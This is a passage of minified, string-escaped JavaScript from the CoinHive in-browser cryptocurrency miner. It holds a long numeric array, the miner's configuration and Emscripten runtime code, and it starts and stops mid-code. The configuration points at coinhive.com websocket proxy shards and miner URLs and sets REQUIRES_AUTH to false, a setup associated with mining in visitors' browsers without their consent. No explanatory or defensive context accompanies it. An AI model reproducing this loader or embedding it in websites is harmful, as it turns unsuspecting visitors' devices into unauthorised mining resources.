49,55,21,3,108,49,56,22,3,108,49,57,23,3,108,50,48,11,6,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,12,9,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,13,30,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,17,3,108,49,52,18,3,108,49,53,19,3,108,49,54,20,3,108,49,55,21,3,108,49,56,22,3,108,49,57,23,3,108,50,48,24,3,108,50,49,25,3,108,50,50,26,3,108,50,51,27,3,108,50,52,28,3,108,50,53,29,3,108,50,54,14,7,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,15,3,0,2,112,48,1,2,108,48,2,2,108,49,16,13,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,9,2,108,56,10,2,108,57,11,3,108,49,48,12,3,108,49,49,17,8,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,18,17,0,2,112,48,1,2,112,49,2,2,108,48,3,2,108,49,4,2,108,50,5,2,108,51,6,2,108,52,7,2,108,53,8,2,108,54,9,2,108,55,10,2,108,56,11,2,108,57,12,3,108,49,48,13,3,108,49,49,14,3,108,49,50,15,3,108,49,51,16,3,108,49,52,19,55,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,9,2,108,56,10,2,108,57,11,3,108,49,48,12,3,108,49,49,13,3,108,49,50,14,3,108,49,51,15,3,108,49,52,16,3,108,49,53,17,3,108,49,54,18,3,108,49,55,19,3,108,49,56,20,3,108,49,57,21,3,108,50,48,22,3,108,50,49,23,3,108,50,50,24,3,108,50,51,25,3,108,50,52,26,3,108,50,53,27,3,108,50,54,28,3,108,50,55,29,3,108,50,56,30,3,108,50,57,31,3,108,51,48,32,3,108,51,49,33,3,108,51,50,34,3,108,51,51,35,3,108,51,52,36,3,108,51,53,37,3,108,51,54,38,3,108,51,55,39,3,108,51,56,40,3,108,51,57,41,3,108,52,48,42,3,108,52,49,43,3,108,52,50,44,3,108,52,51,45,3,108,52,52,46,3,108,52,53,47,3,108,52,54,48,3,108,52,55,49,3,108,52,56,50,3,108,52,57,51,3,108,53,48,52,3,108,53,49,53,3,108,53,50,54,3,108,53,51,20,7,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,21,3,0,2,112,48,1,2,112,49,2,2,112,50,22,65,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,5,2,108,52,6,2,108,53,7,2,108,54,8,2,108,55,9,2,108,56,10,2,108,57,11,3,108,49,48,12,3,108,49,49,13,3,108,49,50,14,3,108,49,51,15,3,108,49,52,16,3,108,49,53,17,3,108,49,54,18,3,108,49,55,19,3,108,49,56,20,3,108,49,57,21,3,108,50,48,22,3,108,50,49,23,3,108,50,50,24,3,108,50,51,25,3,108,50,52,26,3,108,50,53,27,3,108,50,54,28,3,108,50,55,29,3,108,50,56,30,3,108,50,57,31,3,108,51,48,32,3,108,51,49,33,3,108,51,50,34,3,108,51,51,35,3,108,51,52,36,3,108,51,53,37,3,108,51,54,38,3,108,51,55,39,3,108,51,56,40,3,108,51,57,41,3,108,52,48,42,3,108,52,49,43,3,108,52,50,44,3,108,52,51,45,3,108,52,52,46,3,108,52,53,47,3,108,52,54,48,3,108,52,55,49,3,108,52,56,50,3,108,52,57,51,3,108,53,48,52,3,108,53,49,53,3,108,53,50,54,3,108,53,51,55,3,108,53,52,56,3,108,53,53,57,3,108,53,54,58,3,108,53,55,59,3,108,53,56,60,3,108,53,57,61,3,108,54,48,62,3,108,54,49,63,3,108,54,50,64,3,108,54,51,23,55,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,36,3,108,51,50,37,3,108,51,51,38,3,108,51,52,39,3,108,51,53,40,3,108,51,54,41,3,108,51,55,42,3,108,51,56,43,3,108,51,57,44,3,108,52,48,45,3,108,52,49,46,3,108,52,50,47,3,108,52,51,48,3,108,52,52,49,3,108,52,53,50,3,108,52,54,51,3,108,52,55,52,3,108,52,56,53,3,108,52,57,54,3,108,53,48,24,70,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,17,3,108,49,52,18,3,108,49,53,19,3,108,49,54,20,3,108,49,55,21,3,108,49,56,22,3,108,49,57,23,3,108,50,48,24,3,108,50,49,25,3,108,50,50,26,3,108,50,51,27,3,108,50,52,28,3,108,50,53,29,3,108,50,54,30,3,108,50,55,31,3,108,50,56,32,3,108,50,57,33,3,108,51,48,34,3,108,51,49,35,3,108,51,50,36,3,108,51,51,37,3,108,51,52,38,3,108,51,53,39,3,108,51,54,40,3,108,51,55,41,3,108,51,56,42,3,108,51,57,43,3,108,52,48,44,3,108,52,49,45,3,108,52,50,46,3,108,52,51,47,3,108,52,52,48,3,108,52,53,49,3,108,52,54,50,3,108,52,55,51,3,108,52,56,52,3,108,52,57,53,3,108,53,48,54,3,108,53,49,55,3,108,53,50,56,3,108,53,51,57,3,108,53,52,58,3,108,53,53,59,3,108,53,54,60,3,108,53,55,61,3,108,53,56,62,3,108,53,57,63,3,108,54,48,64,3,108,54,49,65,3,108,54,50,66,3,108,54,51,67,3,108,54,52,68,3,108,54,53,69,3,108,54,54,25,36,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,26,108,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,36,3,108,51,50,37,3,108,51,51,38,3,108,51,52,39,3,108,51,53,40,3,108,51,54,41,3,108,51,55,42,3,108,51,56,43,3,108,51,57,44,3,108,52,48,45,3,108,52,49,46,3,108,52,50,47,3,108,52,51,48,3,108,52,52,49,3,108,52,53,50,3,108,52,54,51,3,108,52,55,52,3,108,52,56,53,3,108,52,57,54,3,108,53,48,55,3,108,53,49,56,3,108,53,50,57,3,108,53,51,58,3,108,53,52,59,3,108,53,53,60,3,108,53,54,61,3,108,53,55,62,3,108,53,56,63,3,108,53,57,64,3,108,54,48,65,3,108,54,49,66,3,108,54,50,67,3,108,54,51,68,3,108,54,52,69,3,108,54,53,70,3,108,54,54,71,3,108,54,55,72,3,108,54,56,73,3,108,54,57,74,3,108,55,48,75,3,108,55,49,76,3,108,55,50,77,3,108,55,51,78,3,108,55,52,79,3,108,55,53,80,3,108,55,54,81,3,108,55,55,82,3,108,55,56,83,3,108,55,57,84,3,108,56,48,85,3,108,56,49,86,3,108,56,50,87,3,108,56,51,88,3,108,56,52,89,3,108,56,53,90,3,108,56,54,91,3,108,56,55,92,3,108,56,56,93,3,108,56,57,94,3,108,57,48,95,3,108,57,49,96,3,108,57,50,97,3,108,57,51,98,3,108,57,52,99,3,108,57,53,100,3,108,57,54,101,3,108,57,55,102,3,108,57,56,103,3,108,57,57,104,4,108,49,48,48,105,4,108,49,48,49,106,4,108,49,48,50,107,4,108,49,48,51,27,36,0,2,112,48,1,2,112,49,2,2,108,48,3,2,108,49,4,2,108,50,5,2,108,51,6,2,108,52,7,2,108,53,8,2,108,54,9,2,108,55,10,2,108,56,11,2,108,57,12,3,108,49,48,13,3,108,49,49,14,3,108,49,50,15,3,108,49,51,16,3,108,49,52,17,3,108,49,53,18,3,108,49,54,19,3,108,49,55,20,3,108,49,56,21,3,108,49,57,22,3,108,50,48,23,3,108,50,49,24,3,108,50,50,25,3,108,50,51,26,3,108,50,52,27,3,108,50,53,28,3,108,50,54,29,3,108,50,55,30,3,108,50,56,31,3,108,50,57,32,3,108,51,48,33,3,108,51,49,34,3,108,51,50,35,3,108,51,51,28,5,0,2,112,48,1,2,108,48,2,2,108,49,3,2,108,50,4,2,108,51,29,15,0,2,108,48,1,2,108,49,2,2,108,50,3,2,108,51,4,2,108,52,5,2,108,53,6,2,108,54,7,2,108,55,8,2,108,56,9,2,108,57,10,3,108,49,48,11,3,108,49,49,12,3,108,49,50,13,3,108,49,51,14,3,108,49,52,30,12,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,31,4,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,32,14,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,33,9,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,34,17,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,35,41,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,31,3,108,50,55,32,3,108,50,56,33,3,108,50,57,34,3,108,51,48,35,3,108,51,49,36,3,108,51,50,37,3,108,51,51,38,3,108,51,52,39,3,108,51,53,40,3,108,51,54,36,31,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,30,3,108,50,54,37,30,0,2,112,48,1,2,112,49,2,2,112,50,3,2,112,51,4,2,108,48,5,2,108,49,6,2,108,50,7,2,108,51,8,2,108,52,9,2,108,53,10,2,108,54,11,2,108,55,12,2,108,56,13,2,108,57,14,3,108,49,48,15,3,108,49,49,16,3,108,49,50,17,3,108,49,51,18,3,108,49,52,19,3,108,49,53,20,3,108,49,54,21,3,108,49,55,22,3,108,49,56,23,3,108,49,57,24,3,108,50,48,25,3,108,50,49,26,3,108,50,50,27,3,108,50,51,28,3,108,50,52,29,3,108,50,53,38,2,0,2,112,48,1,2,108,48] ; var Module=typeof Module!==\"undefined\"?Module:{};self.CoinHive=self.CoinHive||{};self.CoinHive.CONFIG={LIB_URL:\"https:\/\/coinhive.com\/lib\/\",ASMJS_NAME:\"worker-asmjs.min.js?v8\",REQUIRES_AUTH:false,WEBSOCKET_SHARDS:[[\"wss:\/\/ws001.coinhive.com\/proxy\",\"wss:\/\/ws002.coinhive.com\/proxy\",\"wss:\/\/ws003.coinhive.com\/proxy\",\"wss:\/\/ws004.coinhive.com\/proxy\",\"wss:\/\/ws005.coinhive.com\/proxy\",\"wss:\/\/ws006.coinhive.com\/proxy\",\"wss:\/\/ws007.coinhive.com\/proxy\",\"wss:\/\/ws008.coinhive.com\/proxy\"],[\"wss:\/\/ws009.coinhive.com\/proxy\",\"wss:\/\/ws010.coinhive.com\/proxy\",\"wss:\/\/ws011.coinhive.com\/proxy\",\"wss:\/\/ws012.coinhive.com\/proxy\",\"wss:\/\/ws013.coinhive.com\/proxy\",\"wss:\/\/ws014.coinhive.com\/proxy\",\"wss:\/\/ws015.coinhive.com\/proxy\",\"wss:\/\/ws016.coinhive.com\/proxy\"],[\"wss:\/\/ws017.coinhive.com\/proxy\",\"wss:\/\/ws018.coinhive.com\/proxy\",\"wss:\/\/ws019.coinhive.com\/proxy\",\"wss:\/\/ws020.coinhive.com\/proxy\",\"wss:\/\/ws021.coinhive.com\/proxy\",\"wss:\/\/ws022.coinhive.com\/proxy\",\"wss:\/\/ws023.coinhive.com\/proxy\",\"wss:\/\/ws024.coinhive.com\/proxy\"],[\"wss:\/\/ws025.coinhive.com\/proxy\",\"wss:\/\/ws026.coinhive.com\/proxy\",\"wss:\/\/ws027.coinhive.com\/proxy\",\"wss:\/\/ws028.coinhive.com\/proxy\",\"wss:\/\/ws029.coinhive.com\/proxy\",\"wss:\/\/ws030.coinhive.com\/proxy\",\"wss:\/\/ws031.coinhive.com\/proxy\",\"wss:\/\/ws032.coinhive.com\/proxy\"]],CAPTCHA_URL:\"https:\/\/coinhive.com\/captcha\/\",MINER_URL:\"https:\/\/coinhive.com\/media\/miner.html\",AUTH_URL:\"https:\/\/authedmine.com\/authenticate.html\"};var Module={locateFile:(function(path){return CoinHive.CONFIG.LIB_URL+path}),wasmBinary:self.WASM_BINARY_INLINE||undefined};var moduleOverrides={};var key;for(key in Module){if(Module.hasOwnProperty(key)){moduleOverrides[key]=Module[key]}}Module[\"arguments\"]=[];Module[\"thisProgram\"]=\".\/this.program\";Module[\"quit\"]=(function(status,toThrow){throw toThrow});Module[\"preRun\"]=[];Module[\"postRun\"]=[];var ENVIRONMENT_IS_WEB=false;var ENVIRONMENT_IS_WORKER=false;var ENVIRONMENT_IS_NODE=false;var ENVIRONMENT_IS_SHELL=false;if(Module[\"ENVIRONMENT\"]){if(Module[\"ENVIRONMENT\"]===\"WEB\"){ENVIRONMENT_IS_WEB=true}else if(Module[\"ENVIRONMENT\"]===\"WORKER\"){ENVIRONMENT_IS_WORKER=true}else if(Module[\"ENVIRONMENT\"]===\"NODE\"){ENVIRONMENT_IS_NODE=true}else if(Module[\"ENVIRONMENT\"]===\"SHELL\"){ENVIRONMENT_IS_SHELL=true}else{throw new Error(\"Module['ENVIRONMENT'] value is not valid. must be one of: WEB|WORKER|NODE|SHELL.\")}}else{ENVIRONMENT_IS_WEB=typeof window===\"object\";ENVIRONMENT_IS_WORKER=typeof importScripts===\"function\";ENVIRONMENT_IS_NODE=typeof process===\"object\"&&typeof require===\"function\"&&!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER;ENVIRONMENT_IS_SHELL=!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_NODE&&!ENVIRONMENT_IS_WORKER}if(ENVIRONMENT_IS_NODE){var nodeFS;var nodePath;Module[\"read\"]=function shell_read(filename,binary){var ret;if(!nodeFS)nodeFS=require(\"fs\");if(!nodePath)nodePath=require(\"path\");filename=nodePath[\"normalize\"](filename);ret=nodeFS[\"readFileSync\"](filename);return binary?ret:ret.toString()};Module[\"readBinary\"]=function readBinary(filename){var ret=Module[\"read\"](filename,true);if(!ret.buffer){ret=new Uint8Array(ret)}assert(ret.buffer);return ret};if(process[\"argv\"].length>1){Module[\"thisProgram\"]=process[\"argv\"][1].replace(\/\\\\\/g,\"\/\")}Module[\"arguments\"]=process[\"argv\"].slice(2);if(typeof module!==\"undefined\"){module[\"exports\"]=Module}process[\"on\"](\"uncaughtException\",(function(ex){if(!(ex instanceof ExitStatus)){throw ex}}));process[\"on\"](\"unhandledRejection\",(function(reason,p){process[\"exit\"](1)}));Module[\"inspect\"]=(function(){return\"[Emscripten Module object]\"})}else if(ENVIRONMENT_IS_SHELL){if(typeof read!=\"undefined\"){Module[\"read\"]=function shell_read(f){return read(f)}}Module[\"readBinary\"]=function readBinary(f){var data;if(typeof readbuffer===\"function\"){return new Uint8Array(readbuffer(f))}data=read(f,\"binary\");assert(typeof data===\"object\");return data};if(typeof scriptArgs!=\"undefined\"){Module[\"arguments\"]=scriptArgs}else if(typeof arguments!=\"undefined\"){Module[\"arguments\"]=arguments}if(typeof quit===\"function\"){Module[\"quit\"]=(function(status,toThrow){quit(status)})}}else if(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER){Module[\"read\"]=function shell_read(url){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,false);xhr.send(null);return xhr.responseText};if(ENVIRONMENT_IS_WORKER){Module[\"readBinary\"]=function readBinary(url){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,false);xhr.responseType=\"arraybuffer\";xhr.send(null);return new Uint8Array(xhr.response)}}Module[\"readAsync\"]=function readAsync(url,onload,onerror){var xhr=new XMLHttpRequest;xhr.open(\"GET\",url,true);xhr.responseType=\"arraybuffer\";xhr.onload=function xhr_onload(){if(xhr.status==200||xhr.status==0&&xhr.response){onload(xhr.response);return}onerror()};xhr.onerror=onerror;xhr.send(null)};if(typeof arguments!=\"undefined\"){Module[\"arguments\"]=arguments}Module[\"setWindowTitle\"]=(function(title){document.title=title})}Module[\"print\"]=typeof console!==\"undefined\"?console.log.bind(console):typeof print!==\"undefined\"?print:null;Module[\"printErr\"]=typeof printErr!==\"undefined\"?printErr:typeof console!==\"undefined\"&&console.warn.bind(console)||Module[\"print\"];Module.print=Module[\"print\"];Module.printErr=Module[\"printErr\"];for(key in moduleOverrides){if(moduleOverrides.hasOwnProperty(key)){Module[key]=moduleOverrides[key]}}moduleOverrides=undefined;var STACK_ALIGN=16;function staticAlloc(size){assert(!staticSealed);var ret=STATICTOP;STATICTOP=STATICTOP+size+15&-16;return ret}function dynamicAlloc(size){assert(DYNAMICTOP_PTR);var ret=HEAP32[DYNAMICTOP_PTR>>2];var end=ret+size+15&-16;HEAP32[DYNAMICTOP_PTR>>2]=end;if(end>=TOTAL_MEMORY){var success=enlargeMemory();if(!success){HEAP32[DYNAMICTOP_PTR>>2]=ret;return 0}}return ret}function alignMemory(size,factor){if(!factor)factor=STACK_ALIGN;var ret=size=Math.ceil(size\/factor)*factor;return ret}function getNativeTypeSize(type){switch(type){case\"i1\":case\"i8\":return 1;case\"i16\":return 2;case\"i32\":return 4;case\"i64\":return 8;case\"float\":return 4;case\"double\":return 8;default:{if(type[type.length-1]===\"*\"){return 4}else if(type[0]===\"i\"){var bits=parseInt(type.substr(1));assert(bits%8===0);return bits\/8}else{return 0}}}}var functionPointers=new Array(0);var GLOBAL_BASE=1024;var ABORT=0;var EXITSTATUS=0;function assert(condition,text){if(!condition){abort(\"Assertion failed: \"+text)}}function setValue(ptr,value,type,noSafe){type=type||\"i8\";if(type.charAt(type.length-1)===\"*\")type=\"i32\";switch(type){case\"i1\":HEAP8[ptr>>0]=value;break;case\"i8\":HEAP8[ptr>>0]=value;break;case\"i16\":HEAP16[ptr>>1]=value;break;case\"i32\":HEAP32[ptr>>2]=value;break;case\"i64\":tempI64=[value>>>0,(tempDouble=value,+Math_abs(tempDouble)>=1?tempDouble>0?(Math_min(+Math_floor(tempDouble\/4294967296),4294967295)|0)>>>0:~~+Math_ceil((tempDouble- +(~~tempDouble>>>0))\/4294967296)>>>0:0)],HEAP32[ptr>>2]=tempI64[0],HEAP32[ptr+4>>2]=tempI64[1];break;case\"float\":HEAPF32[ptr>>2]=value;break;case\"double\":HEAPF64[ptr>>3]=value;break;default:abort(\"invalid type for setValue: \"+type)}}var ALLOC_STATIC=2;var ALLOC_NONE=4;function allocate(slab,types,allocator,ptr){var zeroinit,size;if(typeof slab===\"number\"){zeroinit=true;size=slab}else{zeroinit=false;size=slab.length}var singleType=typeof types===\"string\"?types:null;var ret;if(allocator==ALLOC_NONE){ret=ptr}else{ret=[typeof _malloc===\"function\"?_malloc:staticAlloc,stackAlloc,staticAlloc,dynamicAlloc][allocator===undefined?ALLOC_STATIC:allocator](Math.max(size,singleType?1:types.length))}if(zeroinit){var stop;ptr=ret;assert((ret&3)==0);stop=ret+(size&~3);for(;ptr<stop;ptr+=4){HEAP32[ptr>>2]=0}stop=ret+size;while(ptr<stop){HEAP8[ptr++>>0]=0}return ret}if(singleType===\"i8\"){if(slab.subarray||slab.slice){HEAPU8.set(slab,ret)}else{HEAPU8.set(new Uint8Array(slab),ret)}return ret}var i=0,type,typeSize,previousType;while(i<size){var curr=slab[i];type=singleType||types[i];if(type===0){i++;continue}if(type==\"i64\")type=\"i32\";setValue(ret+i,curr,type);if(previousType!==type){typeSize=getNativeTypeSize(type);previousType=type}i+=typeSize}return ret}function Pointer_stringify(ptr,length){if(length===0||!ptr)return\"\";var hasUtf=0;var t;var i=0;while(1){t=HEAPU8[ptr+i>>0];hasUtf|=t;if(t==0&&!length)break;i++;if(length&&i==length)break}if(!length)length=i;var ret=\"\";if(hasUtf<128){var MAX_CHUNK=1024;var curr;while(length>0){curr=String.fromCharCode.apply(String,HEAPU8.subarray(ptr,ptr+Math.min(length,MAX_CHUNK)));ret=ret?ret+curr:curr;ptr+=MAX_CHUNK;length-=MAX_CHUNK}return ret}return UTF8ToString(ptr)}var UTF8Decoder=typeof TextDecoder!==\"undefined\"?new TextDecoder(\"utf8\"):undefined;function UTF8ArrayToString(u8Array,idx){var endPtr=idx;while(u8Array[endPtr])++endPtr;if(endPtr-idx>16&&u8Array.subarray&&UTF8Decoder){return UTF8Decoder.decode(u8Array.subarray(idx,endPtr))}else{var u0,u1,u2,u3,u4,u5;var str=\"\";while(1){u0=u8Array[idx++];if(!u0)return str;if(!(u0&128)){str+=String.fromCharCode(u0);continue}u1=u8Array[idx++]&63;if((u0&224)==192){str+=String.fromCharCode((u0&31)<<6|u1);continue}u2=u8Array[idx++]&63;if((u0&240)==224){u0=(u0&15)<<12|u1<<6|u2}else{u3=u8Array[idx++]&63;if((u0&248)==240){u0=(u0&7)<<18|u1<<12|u2<<6|u3}else{u4=u8Array[idx++]&63;if((u0&252)==248){u0=(u0&3)<<24|u1<<18|u2<<12|u3<<6|u4}else{u5=u8Array[idx++]&63;u0=(u0&1)<<30|u1<<24|u2<<18|u3<<12|u4<<6|u5}}}if(u0<65536){str+=String.fromCharCode(u0)}else{var ch=u0-65536;str+=String.fromCharCode(55296|ch>>10,56320|ch&1023)}}}}function UTF8ToString(ptr){return UTF8ArrayToString(HEAPU8,ptr)}function stringToUTF8Array(str,outU8Array,outIdx,maxBytesToWrite){if(!(maxBytesToWrite>0))return 0;var startIdx=outIdx;var endIdx=outIdx+maxBytesToWrite-1;for(var i=0;i<str.length;++i){var u=str.charCodeAt(i);if(u>=55296&&u<=57343)u=65536+((u&1023)<<10)|str.charCodeAt(++i)&1023;if(u<=127){if(outIdx>=endIdx)break;outU8Array[outIdx++]=u}else if(u<=2047){if(outIdx+1>=endIdx)break;outU8Array[outIdx++]=192|u>>6;outU8Array[outIdx++]=128|u&63}else if(u<=65535){if(outIdx+2>=endIdx)break;outU8Array[outIdx++]=224|u>>12;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else if(u<=2097151){if(outIdx+3>=endIdx)break;outU8Array[outIdx++]=240|u>>18;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else if(u<=67108863){if(outIdx+4>=endIdx)break;outU8Array[outIdx++]=248|u>>24;outU8Array[outIdx++]=128|u>>18&63;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}else{if(outIdx+5>=endIdx)break;outU8Array[outIdx++]=252|u>>30;outU8Array[outIdx++]=128|u>>24&63;outU8Array[outIdx++]=128|u>>18&63;outU8Array[outIdx++]=128|u>>12&63;outU8Array[outIdx++]=128|u>>6&63;outU8Array[outIdx++]=128|u&63}}outU8Array[outIdx]=0;return outIdx-startIdx}function lengthBytesUTF8(str){var len=0;for(var i=0;i<str.length;++i){var u=str.charCodeAt(i);if(u>=55296&&u<=57343)u=65536+((u&1023)<<10)|str.charCodeAt(++i)&1023;if(u<=127){++len}else if(u<=2047){len+=2}else if(u<=65535){len+=3}else if(u<=2097151){len+=4}else if(u<=67108863){len+=5}else{len+=6}}return len}var UTF16Decoder=typeof TextDecoder!==\"undefined\"?new TextDecoder(\"utf-16le\"):undefined;var WASM_PAGE_SIZE=65536;var ASMJS_PAGE_SIZE=16777216;function alignUp(x,multiple){if(x%multiple>0){x+=multiple-x%multiple}return x}var buffer,HEAP8,HEAPU8,HEAP16,HEAPU16,HEAP32,HEAPU32,HEAPF32,HEAPF64;function updateGlobalBuffer(buf){Module[\"buffer\"]=buffer=buf}function updateGlobalBufferViews(){Module[\"HEAP8\"]=HEAP8=new Int8Array(buffer);Module[\"HEAP16\"]=HEAP16=new Int16Array(buffer);Module[\"HEAP32\"]=HEAP32=new Int32Array(buffer);Module[\"HEAPU8\"]=HEAPU8=new Uint8Array(buffer);Module[\"HEAPU16\"]=HEAPU16=new Uint16Array(buffer);Module[\"HEAPU32\"]=HEAPU32=new Uint32Array(buffer);Module[\"HEAPF32\"]=HEAPF32=new Float32Array(buffer);Module[\"HEAPF64\"]=HEAPF64=new Float64Array(buffer)}var STATIC_BASE,STATICTOP,staticSealed;var STACK_BASE,STACKTOP,STACK_MAX;var DYNAMIC_BASE,DYNAMICTOP_PTR;STATIC_BASE=STATICTOP=STACK_BASE=STACKTOP=STACK_MAX=DYNAMIC_BASE=DYNAMICTOP_PTR=0;staticSealed=false;function abortOnCannotGrowMemory(){abort(\"Cannot enlarge memory arrays. Either (1) compile with -s TOTAL_MEMORY=X with X higher than the current value \"+TOTAL_MEMORY+\", (2) compile with -s ALLOW_MEMORY_GROWTH=1 which allows increasing the size at runtime, or (3) if you want malloc to return NULL (0) instead of this abort, compile with -s ABORTING_MALLOC=0 \")}function enlargeMemory(){abortOnCannotGrowMemory()}var TOTAL_STACK=Module[\"TOTAL_STACK\"]||5242880;var TOTAL_MEMORY=Module[\"TOTAL_MEMORY\"]||16777216;if(TOTAL_MEMORY<TOTAL_STACK)Module.printErr(\"TOTAL_MEMORY should be larger than TOTAL_STACK, was \"+TOTAL_MEMORY+\"! (TOTAL_STACK=\"+TOTAL_STACK+\")\");if(Module[\"buffer\"]){buffer=Module[\"buffer\"]}else{if(typeof WebAssembly===\"object\"&&typeof WebAssembly.Memory===\"function\"){Module[\"wasmMemory\"]=new WebAssembly.Memory({\"initial\":TOTAL_MEMORY\/WASM_PAGE_SIZE,\"maximum\":TOTAL_MEMORY\/WASM_PAGE_SIZE});buffer=Module[\"wasmMemory\"].buffer}else{buffer=new ArrayBuffer(TOTAL_MEMORY)}Module[\"buffer\"]=buffer}updateGlobalBufferViews();function getTotalMemory(){return TOTAL_MEMORY}HEAP32[0]=1668509029;HEAP16[1]=25459;if(HEAPU8[2]!==115||HEAPU8[3]!==99)throw\"Runtime error: expected the system to be little-endian!\";function callRuntimeCallbacks(callbacks){while(callbacks.length>0){var callback=callbacks.shift();if(typeof callback==\"function\"){callback();continue}var func=callback.func;if(typeof func===\"number\"){if(callback.arg===undefined){Module[\"dynCall_v\"](func)}else{Module[\"dynCall_vi\"](func,callback.arg)}}else{func(callback.arg===undefined?null:callback.arg)}}}var __ATPRERUN__=[];var __ATINIT__=[];var __ATMAIN__=[];var __ATEXIT__=[];var __ATPOSTRUN__=[];var runtimeInitialized=false;var runtimeExited=false;function preRun(){if(Module[\"preRun\"]){if(typeof 